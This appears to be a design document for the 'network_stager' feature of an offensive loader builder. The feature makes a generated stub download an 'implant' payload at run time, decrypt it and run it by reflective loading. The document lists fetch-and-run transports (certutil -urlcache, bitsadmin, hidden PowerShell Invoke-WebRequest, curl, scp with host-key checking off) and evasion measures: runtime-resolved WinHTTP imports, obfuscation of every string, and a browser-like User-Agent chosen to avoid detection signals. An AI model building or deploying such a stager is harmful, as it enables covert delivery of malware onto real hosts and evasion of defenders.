# Network stager (`network_stager`)

Status: **implemented (`Stability::Experimental`).** Both transports ship: the
in-process WinHTTP fetch (`downloader: winhttp`, what `auto` picks for `http(s)`)
and the child downloader process (`curl`/`certutil`/`powershell`/`bitsadmin`,
plus `scp://`). `fallback: embedded` — the payload stays embedded and the fetch
is a refresh — also ships. The `ssh` workstream in §6 remains future work, and
so does a runtime `sha256` check of the fetched bytes; WinInet adds nothing over
WinHTTP and is not planned. This document is the design record — the as-built
reference is `src/techniques/network_stager/README.md`.

A runtime network stager: instead of embedding every payload into the generated
stub (encrypted with XChaCha20-Poly1305 and decrypted in-process), the stub
fetches the payload at run time over the network, optionally decrypts it, and
then runs it with the usual execution techniques.

## 1. Goal

- Fetch a payload **at run time**, not at build time, so the payload bytes never
  ship inside the artifact (smaller stub, no embedded-ciphertext signature, and
  the operator can rotate the payload without rebuilding).
- Express it as a **`runtime:` technique step** (a `Category::Control` step),
  so it composes with the existing `on_success`/`on_fail`/`delay_ms` gating and
  chains with the execution techniques.
- Support several transports (`http`, `https`, `ftp`, `scp`) and an optional
  encryption layer for the bytes on the wire.
- Reuse the existing crypto, string-obfuscation, args and runner machinery
  rather than reimplementing any of it.

## 2. Why a technique, not a `build.payloads.<name>.source` change

Today `build.payloads.<name>.source` is resolved by the **packer** at build time:
`http(s)://` is fetched in memory, `file://` is read from disk, and the result is
embedded as ciphertext (`include_bytes!` + `decrypt_step` in the runner — see
`src/engine/steps/mod.rs::render_execution_block`). A stager moves that fetch to the
**stub** at run time, which is a different thing and belongs in the ordered
`runtime:` list next to the step that consumes the result.

## 3. Shape

A Control step that produces the bytes for a named payload, stored where the next
Execution step can read them:

```yaml
runtime:
  - technique: network_stager
    params:
      payload: implant            # the payload name this fetches (build.payloads.implant)
      url: "https://example.invalid/implant.bin"
      downloader: winhttp         # auto | winhttp | curl | certutil | powershell | bitsadmin
      fallback: embedded          # none | embedded (stage with an offline copy)
      agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"   # in-process fetch only
      crypto: none                # none | xchacha20poly1305
      key: <hex 32 bytes>         # only when crypto != none
      nonce: <hex 24 bytes>       # only when crypto != none
      timeout_ms: 30000
      retries: 0
    on_fail: stop
  - technique: reflective_loading
    params:
      payload: implant
```

The URL scheme selects the transport family at build time: `http://` and
`https://` use the configured `downloader` (`auto` = in-process), `ftp://` uses
a child downloader and `scp://` always uses `scp` (there is no separate `method`
field — the scheme is the method). The stager runs first and fills the `implant`
slot; the `reflective_loading` step then runs the fetched (and decrypted) bytes
exactly as it would an embedded payload, or the embedded copy when
`fallback: embedded` and the fetch failed.

## 4. How it plugs into the runner

The runner (`$STEP_RUNNER_BODY$`) currently, per Execution step, does:

```rust
let enc: &[u8] = include_bytes!("payload_N.bin");
let mut image = decrypt_step(enc, NONCE, KEY, LEN)?;
step_N::payload(&mut image)
```

For a **staged** payload there is no `payload_N.bin` and no `include_bytes!`.
The proposal is a small, local change to `render_execution_block`:

```rust
let mut image = crate::take_staged_payload("implant")?;   // filled by the stager
step_N::payload(&mut image)
```

`take_staged_payload` reads a process-global slot (a `OnceLock<Vec<u8>>` or the
existing static-slot pattern already used by the syscall layer for
`stack_spoofing`) that the `network_stager` step populated. No other part of the
runner changes.

## 5. Params (schema)

`TechniqueKind::NetworkStager { params: network_stager::Params }`, with:

| field | type | default | notes |
| --- | --- | --- | --- |
| `payload` | `String` | *(required)* | name in `build.payloads` this step stages; the build detects it and leaves it out of the artifact (or embeds it too, with `fallback: embedded`), and a later Execution step consumes it |
| `url` | `String` | *(required)* | full URL; the scheme selects the transport family (`http(s)` → `downloader`, `scp://` → `scp`) |
| `downloader` | enum `auto\|winhttp\|curl\|certutil\|powershell\|bitsadmin` | `auto` | which transport fetches the blob; `auto` = in-process for `http(s)`, `curl` for `ftp` |
| `fallback` | enum `none\|embedded` | `none` | what the Execution step runs when the fetch fails: nothing to fall back to (strictly staged) or the embedded copy |
| `agent` | `Option<String>` | a generic Windows browser-like string | `User-Agent` for the in-process fetch |
| `crypto` | enum `none\|xchacha20poly1305` | `none` | whether the fetched blob is encrypted |
| `key` / `nonce` | hex strings | *(required when encrypted)* | XChaCha20 key (32 bytes) / nonce (24 bytes) |
| `timeout_ms` | `u32` | `30000` | connect/read timeout |
| `retries` | `u32` | `0` | extra attempts after the first |

All string params are obfuscated through `StringsConfig` (URL, host, credentials,
downloader command and flags), like every other technique's runtime literals.

## 6. Transports and reuse

The transport is decided at build time from the URL scheme and `downloader`, so
the fragment carries no scheme literal. Each step's fragment picks one of two
transport blocks (`transport_winhttp.rs` / `transport_subprocess.rs`, spliced
into `stub_fragment.rs`), and the shared `$STAGER_BLOCK$`
(`src/engine/stager.rs`) holds the global slot and the staged decryption
(`store_staged_payload` / `take_staged_payload`).

The shipped transports:

- **In-process (`downloader: winhttp`, the `auto` choice for `http(s)`)** —
  `winhttp.dll` is loaded at run time (`LoadLibraryA` + `GetProcAddress`, every
  name obfuscated), the URL's host/port/path and the TLS flag are parsed at build
  time, redirects are followed and an HTTP status of 400 or more fails the
  fetch. No child process and no temp file; it is the answer to the clearest
  detection signal of the child-process transports — see
  `src/techniques/network_stager/README.md`.
- **Child process, `http` / `https` / `ftp`** — a downloader chosen by the
  `downloader` param: `curl -sL -o <out> <url>` (the `auto` choice for `ftp`),
  `certutil -urlcache -split -f <url> <out>`, a hidden `powershell -NoProfile
  -Command Invoke-WebRequest`, or `bitsadmin /transfer <job> /download <url>
  <out>`. The param exists so a plan can switch to whichever the host allows.
- **`scp://`** — a child
  `scp -o StrictHostKeyChecking=no [-P <port>] <user@host:path> <out>`, always
  `scp` regardless of `downloader`. Not runtime-verified (no SSH host available)
  and requires a passwordless key.

WinInet was dropped: WinHTTP covers the in-process path, and `ftp://` has no
WinHTTP equivalent, so it stays on the child-process transport.

## 7. Crypto reuse

When `crypto: xchacha20poly1305`, the stager decrypts the fetched blob in the
stub with the same `chacha20poly1305` + `hex` crates; the helper is
`decrypt_staged` (`src/engine/stager.rs`), a staged variant that skips the
plaintext-length check `decrypt_step` performs (the size is unknown at build
time). The key/nonce are declared on the step as hex strings.

## 8. Reuse map (what is NOT reimplemented)

- **Crypto**: `chacha20poly1305` / `hex`, the staged decryption
  (`decrypt_staged`, `src/engine/stager.rs`).
- **Obfuscation**: `StringsConfig::obfuscate` for every runtime literal.
- **Args / runtime config**: `$ARGS_BLOCK$` + `$arg.N$` for URL/credentials.
- **Gating**: the standard `StepControl` (`on_success`/`on_fail`/`delay_ms`).
- **Runner**: only `render_execution_block`'s fetch-and-decrypt line changes.
- **Payload pinning**: reuse `plan::steps::resolve`'s named-payload resolution.
- **Scheme detection**: done at build time (the fragment carries no scheme
  literal), the same split `src/engine/fetch.rs` makes.

## 9. Validation rules (`plan::validate`)

- At most one `network_stager` step per runtime (it fills a single slot).
- `params.payload` must name an existing `build.payloads` entry; the build
  detects the stager and leaves that payload out of the artifact (its `source` is
  ignored) unless `fallback: embedded` keeps it embedded as the offline copy.
- The stager must precede the Execution step that consumes `payload`, and that
  payload must be loaded by **exactly one** Execution step.
- `url` must use `http://`, `https://`, `ftp://` or `scp://`. An `http(s)` URL
  that routes to the in-process transport (`auto`/`winhttp`) must parse at build
  time (a host and a valid port).
- `downloader: winhttp` only accepts `http://` and `https://` URLs.
- `crypto: xchacha20poly1305` requires `key` (64 hex chars) and `nonce` (48 hex
  chars).
- With `fallback: embedded` the payload is embedded like any stageless payload,
  so its `source` is read, validated and hash-pinned at build time.
- The existing terminal-step rule still applies (a staged `reflective_loading`
  of a PE executable remains terminal unless it sets `params.patch_exit: true`).

## 10. Open design decisions

*(Settled at implementation: a payload is staged by being named in a
`network_stager` step — no separate `staged: true` flag. The stager keeps one
global slot guarded by a `Mutex`. The in-process transport is
`downloader: winhttp` and `auto` picks it for `http(s)`, where the child process
was the original plan; `ftp://` and `scp://` stay on the child-process
transport. `fallback: embedded` answers open decision 1 the other way: instead
of a `staged: true` flag, the step's `fallback` decides whether the artifact
keeps an embedded copy — `source` stays meaningful for it, and the Execution
step prefers the fetched bytes.)*

1. **How is a payload marked "staged"?** Settled: being named by the stager,
   with `fallback` deciding whether an embedded copy must exist as well.
2. **Slot ownership.** Settled: one global slot, at most one stager per runtime.
3. **`ssh` scope.** Subprocess vs. in-Rust client (see §6).

## 11. Phases

- **M0 — schema + registry.** ✅ `TechniqueKind::NetworkStager`, `Params`, `DEF`
  (category `Control`, ATT&CK T1105/T1071).
- **M1 — in-process fetch + runner wiring.** ✅ `downloader: winhttp`
  (`transport_winhttp.rs`): dynamic resolution of every entry point, the
  build-time URL parse, redirect following, the status check, the
  `$STAGER_BLOCK$` slot and the `render_execution_block` wiring. Verified end to
  end against a loopback server (`stages_and_runs_a_payload_over_winhttp`,
  `tests/cli.rs`) and compiled for i686
  (`compiles_both_stager_transports_for_i686`).
- **M2 — crypto.** ✅ `xchacha20poly1305` decrypt of the fetched blob
  (`decrypt_staged`); key/nonce from the step or `$arg.N$`.
- **M3 — `http` + `ftp` + timeouts.** ✅ `ftp://` stays on the child-process
  transport (no WinHTTP equivalent); per-transport timeouts and retries are in.
  WinInet was dropped in favor of WinHTTP.
- **M4 — `ssh`.** ⬜ Decide subprocess vs. client; likely its own workstream.
- **M5 — wizard + docs + measurements.** Mostly done (docs are current, the
  plan builder understands `downloader: winhttp`/`fallback`, and the loopback
  runtime verification is in `docs/measurements.md`); still pending: a wizard
  prompt for `network_stager` and a run against a real (non-loopback)
  deployment.

## 12. Risks

- **The WinHTTP IAT risk is mitigated**: every entry point is resolved at run
  time from obfuscated bytes, so `winhttp.dll` never enters the import table and
  no function name reaches `.rdata`; the loader gains only the
  `LoadLibraryA`/`GetProcAddress` pair it already imports elsewhere. What
  remains observable is runtime: a network connection from the loader process and
  the `winhttp.dll` module load (module-load telemetry).
- **`ssh` is disproportionate** — flag it clearly so it does not block M0–M3.
- **A staged payload cannot be verified at build time** (nothing to inspect), so
  `build.payloads.<name>.sha256` would become a *runtime* check the stager
  performs after fetching. With `fallback: embedded` the embedded digest is known
  at build time and could be compared at run time in a future pass.
- **One slot, one consumer** — a plan that stages twice must be rejected early.

## 13. References

- `src/engine/steps/mod.rs` — `render_execution_block`, `STUB_HELPERS` (`decrypt_step`).
- `src/engine/fetch.rs` — build-time URL scheme handling to mirror.
- `src/techniques/` — technique registry + `Category::Control`.
- `src/plan/schema/mod.rs` — `PayloadPlan`, `CryptoPlan`, `StepControl`.
- `examples/stubs/runtime-key.rs` — runtime key material via `$arg.N$`.
